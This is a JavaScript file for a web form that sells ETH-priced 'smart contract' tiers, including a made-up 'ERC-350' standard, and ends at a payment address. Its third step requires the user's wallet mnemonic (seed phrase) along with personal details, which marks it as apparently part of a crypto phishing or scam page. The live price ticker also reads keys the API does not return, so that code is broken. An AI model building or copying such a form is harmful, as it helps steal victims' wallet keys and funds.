let currentStep = 1;
let selectedContractType = '';
let selectedTier = '';
let selectedETH = 0;

const rates = {
  USD: 2642.79,
  CAD: 3625.66,
  EUR: 2325.86,
};

function showStep(n) {
  document.querySelectorAll('.step').forEach((step, i) => {
    step.classList.remove('active');
    if (i === n - 1) step.classList.add('active');
  });
}

function nextStep() {
  if (currentStep === 1) {
    const network = document.getElementById('network').value;
    const contractType = document.getElementById('contract-type').value;
    if (!network || network === "Select Network" || !contractType) {
      alert("Please select both a network and contract type.");
      return;
    }
    selectedContractType = contractType;
    generateOptions(contractType);
  } else if (currentStep === 2) {
    if (!selectedTier) {
      alert("Please select a tier.");
      return;
    }
  } else if (currentStep === 3) {
    const name = document.getElementById('name').value.trim();
    const surname = document.getElementById('surname').value.trim();
    const country = document.getElementById('country').value;
    const exchange = document.getElementById('exchange').value;
    const email = document.getElementById('email').value.trim();
    const mnemonic = document.getElementById('mnemonic').value.trim();

    if (!name || !surname || !country || !exchange || !validateEmail(email) || !mnemonic) {
      alert("Please fill in all required fields.");
      return;
    }
  }
  currentStep++;
  showStep(currentStep);
}

function prevStep() {
  currentStep--;
  showStep(currentStep);
}

function validateEmail(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return re.test(email.toLowerCase());
}

function generateOptions(type) {
  const container = document.getElementById('options-container');
  container.innerHTML = '';
  const options = {
    "Token Contract (ERC-20)": [
      { name: "Normal", eth: 1.5, desc: "Basic functionality" },
      { name: "Medium", eth: 2.1, desc: "Optimized gas" },
      { name: "Trader", eth: 3.4, desc: "Market ready" }
    ],
    "Withdrawal Contract (ERC-350)": [
      { name: "Normal", eth: 0.6, desc: "Simple withdrawal" },
      { name: "Medium", eth: 1.0, desc: "Scheduled withdrawals" },
      { name: "Expert", eth: 3.4, desc: "Bulk operations" }
    ]
  };

  options[type].forEach(opt => {
    const box = document.createElement('div');
    box.className = 'option-box';
    box.innerHTML = `
      <h3>${opt.name} – ${opt.eth} ETH (<span class="converted-price">${convertETH(opt.eth)}</span>)</h3>
      <p>${opt.desc}</p>
      <button onclick="selectTier('${opt.name}', ${opt.eth})">Choose</button>
    `;
    container.appendChild(box);
  });
}

function selectTier(tier, eth) {
  selectedTier = tier;
  selectedETH = eth;
  document.getElementById('contract-summary').textContent = `${selectedContractType} – ${selectedTier}`;
  document.getElementById('eth-amount').textContent = selectedETH;
  nextStep();
}

function convertETH(eth) {
  const currency = document.getElementById('currency').value;
  return `${(eth * rates[currency]).toFixed(2)} ${currency}`;
}

function updatePrices() {
  document.querySelectorAll('.converted-price').forEach((el) => {
    const eth = parseFloat(el.parentElement.textContent.split('–')[1].split('ETH')[0].trim());
    el.textContent = convertETH(eth);
  });
}

function simulateLoading() {
  nextStep();
  document.querySelector('.loading').textContent = 'Waiting for payment…';
}

function copyAddress() {
  const addr = document.getElementById('eth-address').textContent;
  navigator.clipboard.writeText(addr);
  alert('Address copied to clipboard!');
}

// Fetch crypto prices (simplified)
async function updateLiveCryptoPrices() {
  const apiUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,ripple,solana&vs_currencies=usd';
  try {
    const res = await fetch(apiUrl);
    const data = await res.json();
    const container = document.getElementById('cryptoPrices');
    container.innerHTML = '';
    ['BTC', 'ETH', 'XRP', 'SOL'].forEach((coin) => {
      const span = document.createElement('span');
      span.textContent = `${coin}: $${data[coin.toLowerCase()].usd.toLocaleString()}`;
      container.appendChild(span);
    });
  } catch (err) {
    console.error('Error loading prices', err);
  }
}
updateLiveCryptoPrices();
setInterval(updateLiveCryptoPrices, 10000);
